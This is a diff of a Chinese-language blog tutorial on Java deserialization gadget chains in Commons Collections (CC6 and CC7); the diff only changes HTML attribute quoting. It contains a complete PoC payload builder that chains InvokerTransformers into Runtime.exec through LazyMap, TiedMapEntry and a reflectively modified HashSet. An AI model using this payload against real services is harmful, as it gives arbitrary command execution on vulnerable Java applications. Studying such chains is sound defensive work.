 <li>map 设置为设计好的 lazyMap，就可以在 map.get(key) 时命令执行。</li>
 </ol>
 <p>PoC：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> Object <span style="color:#a6e22e">getObject</span><span style="color:#f92672">(</span><span style="color:#66d9ef">final</span> String commands<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> Exception <span style="color:#f92672">{</span>
-    <span style="color:#75715e">// Init the transformer to exec commands.
-</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">final</span> Transformer transformerChain <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ChainedTransformer<span style="color:#f92672">(</span>
-            <span style="color:#66d9ef">new</span> Transformer<span style="color:#f92672">[]{</span>
-                    <span style="color:#66d9ef">new</span> ConstantTransformer<span style="color:#f92672">(</span>Runtime<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">),</span>
-                    <span style="color:#66d9ef">new</span> InvokerTransformer<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;getMethod&#34;</span><span style="color:#f92672">,</span>
-                            <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]{</span>String<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">,</span> Class<span style="color:#f92672">[].</span><span style="color:#a6e22e">class</span><span style="color:#f92672">},</span>
-                            <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]{</span><span style="color:#e6db74">&#34;getRuntime&#34;</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[</span>0<span style="color:#f92672">]}),</span>
-                    <span style="color:#66d9ef">new</span> InvokerTransformer<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;invoke&#34;</span><span style="color:#f92672">,</span>
-                            <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]{</span>Object<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">,</span> Object<span style="color:#f92672">[].</span><span style="color:#a6e22e">class</span><span style="color:#f92672">},</span>
-                            <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]{</span><span style="color:#66d9ef">null</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[</span>0<span style="color:#f92672">]}),</span>
-                    <span style="color:#66d9ef">new</span> InvokerTransformer<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;exec&#34;</span><span style="color:#f92672">,</span>
-                            <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]{</span>String<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">},</span>
-                            <span style="color:#66d9ef">new</span> String<span style="color:#f92672">[]{</span>commands<span style="color:#f92672">}),</span>
-                    <span style="color:#66d9ef">new</span> ConstantTransformer<span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> HashSet<span style="color:#f92672">&lt;&gt;())</span>
-            <span style="color:#f92672">}</span>
-    <span style="color:#f92672">);</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=color:#66d9ef>private</span> <span style=color:#66d9ef>static</span> Object <span style=color:#a6e22e>getObject</span><span style=color:#f92672>(</span><span style=color:#66d9ef>final</span> String commands<span style=color:#f92672>)</span> <span style=color:#66d9ef>throws</span> Exception <span style=color:#f92672>{</span>
+    <span style=color:#75715e>// Init the transformer to exec commands.
+</span><span style=color:#75715e></span>    <span style=color:#66d9ef>final</span> Transformer transformerChain <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ChainedTransformer<span style=color:#f92672>(</span>
+            <span style=color:#66d9ef>new</span> Transformer<span style=color:#f92672>[]{</span>
+                    <span style=color:#66d9ef>new</span> ConstantTransformer<span style=color:#f92672>(</span>Runtime<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>),</span>
+                    <span style=color:#66d9ef>new</span> InvokerTransformer<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;getMethod&#34;</span><span style=color:#f92672>,</span>
+                            <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]{</span>String<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>,</span> Class<span style=color:#f92672>[].</span><span style=color:#a6e22e>class</span><span style=color:#f92672>},</span>
+                            <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]{</span><span style=color:#e6db74>&#34;getRuntime&#34;</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[</span>0<span style=color:#f92672>]}),</span>
+                    <span style=color:#66d9ef>new</span> InvokerTransformer<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;invoke&#34;</span><span style=color:#f92672>,</span>
+                            <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]{</span>Object<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>,</span> Object<span style=color:#f92672>[].</span><span style=color:#a6e22e>class</span><span style=color:#f92672>},</span>
+                            <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]{</span><span style=color:#66d9ef>null</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[</span>0<span style=color:#f92672>]}),</span>
+                    <span style=color:#66d9ef>new</span> InvokerTransformer<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;exec&#34;</span><span style=color:#f92672>,</span>
+                            <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]{</span>String<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>},</span>
+                            <span style=color:#66d9ef>new</span> String<span style=color:#f92672>[]{</span>commands<span style=color:#f92672>}),</span>
+                    <span style=color:#66d9ef>new</span> ConstantTransformer<span style=color:#f92672>(</span><span style=color:#66d9ef>new</span> HashSet<span style=color:#f92672>&lt;&gt;())</span>
+            <span style=color:#f92672>}</span>
+    <span style=color:#f92672>);</span>
 
-    <span style="color:#75715e">// create lazyMap with transformer
-</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">final</span> Map innerMap <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap<span style="color:#f92672">();</span>
-    <span style="color:#66d9ef">final</span> Map lazyMap <span style="color:#f92672">=</span> LazyMap<span style="color:#f92672">.</span><span style="color:#a6e22e">decorate</span><span style="color:#f92672">(</span>innerMap<span style="color:#f92672">,</span> transformerChain<span style="color:#f92672">);</span>
+    <span style=color:#75715e>// create lazyMap with transformer
+</span><span style=color:#75715e></span>    <span style=color:#66d9ef>final</span> Map innerMap <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> HashMap<span style=color:#f92672>();</span>
+    <span style=color:#66d9ef>final</span> Map lazyMap <span style=color:#f92672>=</span> LazyMap<span style=color:#f92672>.</span><span style=color:#a6e22e>decorate</span><span style=color:#f92672>(</span>innerMap<span style=color:#f92672>,</span> transformerChain<span style=color:#f92672>);</span>
 
-    TiedMapEntry entry <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TiedMapEntry<span style="color:#f92672">(</span>lazyMap<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;foo&#34;</span><span style="color:#f92672">);</span>
+    TiedMapEntry entry <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> TiedMapEntry<span style=color:#f92672>(</span>lazyMap<span style=color:#f92672>,</span> <span style=color:#e6db74>&#34;foo&#34;</span><span style=color:#f92672>);</span>
 
-    <span style="color:#75715e">// Create a HashSet object
-</span><span style="color:#75715e"></span>    HashSet map <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashSet<span style="color:#f92672">(</span>1<span style="color:#f92672">);</span>
-    map<span style="color:#f92672">.</span><span style="color:#a6e22e">add</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;foo&#34;</span><span style="color:#f92672">);</span>
+    <span style=color:#75715e>// Create a HashSet object
+</span><span style=color:#75715e></span>    HashSet map <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> HashSet<span style=color:#f92672>(</span>1<span style=color:#f92672>);</span>
+    map<span style=color:#f92672>.</span><span style=color:#a6e22e>add</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;foo&#34;</span><span style=color:#f92672>);</span>
 
-    <span style="color:#75715e">// Get map field value of HashSet
-</span><span style="color:#75715e"></span>    Field f <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">;</span>
-    <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
-        f <span style="color:#f92672">=</span> HashSet<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getDeclaredField</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;map&#34;</span><span style="color:#f92672">);</span>
-    <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>NoSuchFieldException e<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
-        f <span style="color:#f92672">=</span> HashSet<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getDeclaredField</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;backingMap&#34;</span><span style="color:#f92672">);</span>
-    <span style="color:#f92672">}</span>
-    f<span style="color:#f92672">.</span><span style="color:#a6e22e">setAccessible</span><span style="color:#f92672">(</span><span style="color:#66d9ef">true</span><span style="color:#f92672">);</span>
-    HashMap innimpl <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>HashMap<span style="color:#f92672">)</span> f<span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span>map<span style="color:#f92672">);</span>
+    <span style=color:#75715e>// Get map field value of HashSet
+</span><span style=color:#75715e></span>    Field f <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>;</span>
+    <span style=color:#66d9ef>try</span> <span style=color:#f92672>{</span>
+        f <span style=color:#f92672>=</span> HashSet<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getDeclaredField</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;map&#34;</span><span style=color:#f92672>);</span>
+    <span style=color:#f92672>}</span> <span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>NoSuchFieldException e<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+        f <span style=color:#f92672>=</span> HashSet<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getDeclaredField</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;backingMap&#34;</span><span style=color:#f92672>);</span>
+    <span style=color:#f92672>}</span>
+    f<span style=color:#f92672>.</span><span style=color:#a6e22e>setAccessible</span><span style=color:#f92672>(</span><span style=color:#66d9ef>true</span><span style=color:#f92672>);</span>
+    HashMap innimpl <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>HashMap<span style=color:#f92672>)</span> f<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span>map<span style=color:#f92672>);</span>
 
-    <span style="color:#75715e">// get table field value of map(HashMap)
-</span><span style="color:#75715e"></span>    Field f2 <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">;</span>
-    <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
-        f2 <span style="color:#f92672">=</span> HashMap<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getDeclaredField</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;table&#34;</span><span style="color:#f92672">);</span>
-    <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>NoSuchFieldException e<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
-        f2 <span style="color:#f92672">=</span> HashMap<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getDeclaredField</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;elementData&#34;</span><span style="color:#f92672">);</span>
-    <span style="color:#f92672">}</span>
-    f2<span style="color:#f92672">.</span><span style="color:#a6e22e">setAccessible</span><span style="color:#f92672">(</span><span style="color:#66d9ef">true</span><span style="color:#f92672">);</span>
-    Object<span style="color:#f92672">[]</span> array <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>Object<span style="color:#f92672">[])</span> f2<span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span>innimpl<span style="color:#f92672">);</span>
+    <span style=color:#75715e>// get table field value of map(HashMap)
+</span><span style=color:#75715e></span>    Field f2 <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>;</span>
+    <span style=color:#66d9ef>try</span> <span style=color:#f92672>{</span>
+        f2 <span style=color:#f92672>=</span> HashMap<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getDeclaredField</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;table&#34;</span><span style=color:#f92672>);</span>
+    <span style=color:#f92672>}</span> <span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>NoSuchFieldException e<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+        f2 <span style=color:#f92672>=</span> HashMap<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getDeclaredField</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;elementData&#34;</span><span style=color:#f92672>);</span>
+    <span style=color:#f92672>}</span>
+    f2<span style=color:#f92672>.</span><span style=color:#a6e22e>setAccessible</span><span style=color:#f92672>(</span><span style=color:#66d9ef>true</span><span style=color:#f92672>);</span>
+    Object<span style=color:#f92672>[]</span> array <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>Object<span style=color:#f92672>[])</span> f2<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span>innimpl<span style=color:#f92672>);</span>
 
-    <span style="color:#75715e">// get key field of table
-</span><span style="color:#75715e"></span>    Object node <span style="color:#f92672">=</span> array<span style="color:#f92672">[</span>0<span style="color:#f92672">];</span>
-    <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>node <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
-        node <span style="color:#f92672">=</span> array<span style="color:#f92672">[</span>1<span style="color:#f92672">];</span>
-    <span style="color:#f92672">}</span>
-    Field keyField <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">;</span>
-    <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
-        keyField <span style="color:#f92672">=</span> node<span style="color:#f92672">.</span><span style="color:#a6e22e">getClass</span><span style="color:#f92672">().</span><span style="color:#a6e22e">getDeclaredField</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;key&#34;</span><span style="color:#f92672">);</span>
-    <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>Exception e<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
-        keyField <span style="color:#f92672">=</span> Class<span style="color:#f92672">.</span><span style="color:#a6e22e">forName</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;java.util.MapEntry&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">getDeclaredField</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;key&#34;</span><span style="color:#f92672">);</span>
-    <span style="color:#f92672">}</span>
+    <span style=color:#75715e>// get key field of table
+</span><span style=color:#75715e></span>    Object node <span style=color:#f92672>=</span> array<span style=color:#f92672>[</span>0<span style=color:#f92672>];</span>
+    <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>node <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+        node <span style=color:#f92672>=</span> array<span style=color:#f92672>[</span>1<span style=color:#f92672>];</span>
+    <span style=color:#f92672>}</span>
+    Field keyField <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>;</span>
+    <span style=color:#66d9ef>try</span> <span style=color:#f92672>{</span>
+        keyField <span style=color:#f92672>=</span> node<span style=color:#f92672>.</span><span style=color:#a6e22e>getClass</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getDeclaredField</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;key&#34;</span><span style=color:#f92672>);</span>
+    <span style=color:#f92672>}</span> <span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>Exception e<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+        keyField <span style=color:#f92672>=</span> Class<span style=color:#f92672>.</span><span style=color:#a6e22e>forName</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;java.util.MapEntry&#34;</span><span style=color:#f92672>).</span><span style=color:#a6e22e>getDeclaredField</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;key&#34;</span><span style=color:#f92672>);</span>
+    <span style=color:#f92672>}</span>
     
-    <span style="color:#75715e">// set the value to TiedMapEntry
-</span><span style="color:#75715e"></span>    keyField<span style="color:#f92672">.</span><span style="color:#a6e22e">setAccessible</span><span style="color:#f92672">(</span><span style="color:#66d9ef">true</span><span style="color:#f92672">);</span>
-    keyField<span style="color:#f92672">.</span><span style="color:#a6e22e">set</span><span style="color:#f92672">(</span>node<span style="color:#f92672">,</span> entry<span style="color:#f92672">);</span>
+    <span style=color:#75715e>// set the value to TiedMapEntry
+</span><span style=color:#75715e></span>    keyField<span style=color:#f92672>.</span><span style=color:#a6e22e>setAccessible</span><span style=color:#f92672>(</span><span style=color:#66d9ef>true</span><span style=color:#f92672>);</span>
+    keyField<span style=color:#f92672>.</span><span style=color:#a6e22e>set</span><span style=color:#f92672>(</span>node<span style=color:#f92672>,</span> entry<span style=color:#f92672>);</span>
 
-    <span style="color:#66d9ef">return</span> map<span style="color:#f92672">;</span>
-<span style="color:#f92672">}</span>
+    <span style=color:#66d9ef>return</span> map<span style=color:#f92672>;</span>
+<span style=color:#f92672>}</span>
 </code></pre></div><p>后面的代码其实就是通过反射定位到最后的Entry，并且设置值为TiedMapEntry。</p>
-<h2 id="commonscollections7">CommonsCollections7</h2>
+<h2 id=commonscollections7>CommonsCollections7</h2>
 <p>CC7也是在寻找一种不同的触发方式，这次使用的是AbstractMap#equals方法，</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">boolean</span> <span style="color:#a6e22e">equals</span><span style="color:#f92672">(</span>Object o<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
-    <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>o <span style="color:#f92672">==</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">)</span>
-        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span><span style="color:#f92672">;</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>boolean</span> <span style=color:#a6e22e>equals</span><span style=color:#f92672>(</span>Object o<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+    <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>o <span style=color:#f92672>==</span> <span style=color:#66d9ef>this</span><span style=color:#f92672>)</span>
+        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>true</span><span style=color:#f92672>;</span>
 
-    <span style="color:#66d9ef">if</span> <span style="color:#f92672">(!(</span>o <span style="color:#66d9ef">instanceof</span> Map<span style="color:#f92672">))</span>
-        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span><span style="color:#f92672">;</span>
-    Map<span style="color:#f92672">&lt;</span>K<span style="color:#f92672">,</span>V<span style="color:#f92672">&gt;</span> m <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>Map<span style="color:#f92672">&lt;</span>K<span style="color:#f92672">,</span>V<span style="color:#f92672">&gt;)</span> o<span style="color:#f92672">;</span>
-    <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>m<span style="color:#f92672">.</span><span style="color:#a6e22e">size</span><span style="color:#f92672">()</span> <span style="color:#f92672">!=</span> size<span style="color:#f92672">())</span>
-        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span><span style="color:#f92672">;</span>
+    <span style=color:#66d9ef>if</span> <span style=color:#f92672>(!(</span>o <span style=color:#66d9ef>instanceof</span> Map<span style=color:#f92672>))</span>
+        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span><span style=color:#f92672>;</span>
+    Map<span style=color:#f92672>&lt;</span>K<span style=color:#f92672>,</span>V<span style=color:#f92672>&gt;</span> m <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>Map<span style=color:#f92672>&lt;</span>K<span style=color:#f92672>,</span>V<span style=color:#f92672>&gt;)</span> o<span style=color:#f92672>;</span>
+    <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>m<span style=color:#f92672>.</span><span style=color:#a6e22e>size</span><span style=color:#f92672>()</span> <span style=color:#f92672>!=</span> size<span style=color:#f92672>())</span>
+        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span><span style=color:#f92672>;</span>
 
-    <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
-        Iterator<span style="color:#f92672">&lt;</span>Entry<span style="color:#f92672">&lt;</span>K<span style="color:#f92672">,</span>V<span style="color:#f92672">&gt;&gt;</span> i <span style="color:#f92672">=</span> entrySet<span style="color:#f92672">().</span><span style="color:#a6e22e">iterator</span><span style="color:#f92672">();</span>
-        <span style="color:#66d9ef">while</span> <span style="color:#f92672">(</span>i<span style="color:#f92672">.</span><span style="color:#a6e22e">hasNext</span><span style="color:#f92672">())</span> <span style="color:#f92672">{</span>
-            Entry<span style="color:#f92672">&lt;</span>K<span style="color:#f92672">,</span>V<span style="color:#f92672">&gt;</span> e <span style="color:#f92672">=</span> i<span style="color:#f92672">.</span><span style="color:#a6e22e">next</span><span style="color:#f92672">();</span>
-            K key <span style="color:#f92672">=</span> e<span style="color:#f92672">.</span><span style="color:#a6e22e">getKey</span><span style="color:#f92672">();</span>
-            V value <span style="color:#f92672">=</span> e<span style="color:#f92672">.</span><span style="color:#a6e22e">getValue</span><span style="color:#f92672">();</span>
-            <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>value <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
-                <span style="color:#66d9ef">if</span> <span style="color:#f92672">(!(</span>m<span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span>key<span style="color:#f92672">)==</span><span style="color:#66d9ef">null</span> <span style="color:#f92672">&amp;&amp;</span> m<span style="color:#f92672">.</span><span style="color:#a6e22e">containsKey</span><span style="color:#f92672">(</span>key<span style="color:#f92672">)))</span>
-                    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span><span style="color:#f92672">;</span>
-            <span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#f92672">{</span>
-                <span style="color:#66d9ef">if</span> <span style="color:#f92672">(!</span>value<span style="color:#f92672">.</span><span style="color:#a6e22e">equals</span><span style="color:#f92672">(</span>m<span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span>key<span style="color:#f92672">)))</span>
-                    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span><span style="color:#f92672">;</span>
-            <span style="color:#f92672">}</span>
-        <span style="color:#f92672">}</span>
-    <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>ClassCastException unused<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
-        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span><span style="color:#f92672">;</span>
-    <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>NullPointerException unused<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
-        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span><span style="color:#f92672">;</span>
-    <span style="color:#f92672">}</span>
+    <span style=color:#66d9ef>try</span> <span style=color:#f92672>{</span>
+        Iterator<span style=color:#f92672>&lt;</span>Entry<span style=color:#f92672>&lt;</span>K<span style=color:#f92672>,</span>V<span style=color:#f92672>&gt;&gt;</span> i <span style=color:#f92672>=</span> entrySet<span style=color:#f92672>().</span><span style=color:#a6e22e>iterator</span><span style=color:#f92672>();</span>
+        <span style=color:#66d9ef>while</span> <span style=color:#f92672>(</span>i<span style=color:#f92672>.</span><span style=color:#a6e22e>hasNext</span><span style=color:#f92672>())</span> <span style=color:#f92672>{</span>
+            Entry<span style=color:#f92672>&lt;</span>K<span style=color:#f92672>,</span>V<span style=color:#f92672>&gt;</span> e <span style=color:#f92672>=</span> i<span style=color:#f92672>.</span><span style=color:#a6e22e>next</span><span style=color:#f92672>();</span>
+            K key <span style=color:#f92672>=</span> e<span style=color:#f92672>.</span><span style=color:#a6e22e>getKey</span><span style=color:#f92672>();</span>
+            V value <span style=color:#f92672>=</span> e<span style=color:#f92672>.</span><span style=color:#a6e22e>getValue</span><span style=color:#f92672>();</span>
+            <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>value <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+                <span style=color:#66d9ef>if</span> <span style=color:#f92672>(!(</span>m<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span>key<span style=color:#f92672>)==</span><span style=color:#66d9ef>null</span> <span style=color:#f92672>&amp;&amp;</span> m<span style=color:#f92672>.</span><span style=color:#a6e22e>containsKey</span><span style=color:#f92672>(</span>key<span style=color:#f92672>)))</span>
+                    <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span><span style=color:#f92672>;</span>
+            <span style=color:#f92672>}</span> <span style=color:#66d9ef>else</span> <span style=color:#f92672>{</span>
+                <span style=color:#66d9ef>if</span> <span style=color:#f92672>(!</span>value<span style=color:#f92672>.</span><span style=color:#a6e22e>equals</span><span style=color:#f92672>(</span>m<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span>key<span style=color:#f92672>)))</span>
+                    <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span><span style=color:#f92672>;</span>
+            <span style=color:#f92672>}</span>
+        <span style=color:#f92672>}</span>
+    <span style=color:#f92672>}</span> <span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>ClassCastException unused<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span><span style=color:#f92672>;</span>
+    <span style=color:#f92672>}</span> <span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>NullPointerException unused<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span><span style=color:#f92672>;</span>
+    <span style=color:#f92672>}</span>
 
-    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span><span style="color:#f92672">;</span>
-<span style="color:#f92672">}</span>
+    <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>true</span><span style=color:#f92672>;</span>
+<span style=color:#f92672>}</span>
 </code></pre></div><p>在try中，会调用到 m.get(key) 方法，而向上看可以知道，这个map就是equals的参数，所以只要能设法让一个Map调用这个方法和LazyMap比较就可以达到目的。看一看CC7是怎么做的。CC7用到的是Hashtable#reconstitutionPut，</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">reconstitutionPut</span><span style="color:#f92672">(</span>Entry<span style="color:#f92672">&lt;</span>K<span style="color:#f92672">,</span>V<span style="color:#f92672">&gt;[]</span> tab<span style="color:#f92672">,</span> K key<span style="color:#f92672">,</span> V value<span style="color:#f92672">)</span>
-    <span style="color:#66d9ef">throws</span> StreamCorruptedException
-<span style="color:#f92672">{</span>
-    <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>value <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
-        <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> java<span style="color:#f92672">.</span><span style="color:#a6e22e">io</span><span style="color:#f92672">.</span><span style="color:#a6e22e">StreamCorruptedException</span><span style="color:#f92672">();</span>
-    <span style="color:#f92672">}</span>
-    <span style="color:#75715e">// Makes sure the key is not already in the hashtable.
-</span><span style="color:#75715e"></span>    <span style="color:#75715e">// This should not happen in deserialized version.
-</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">int</span> hash <span style="color:#f92672">=</span> hash<span style="color:#f92672">(</span>key<span style="color:#f92672">);</span>
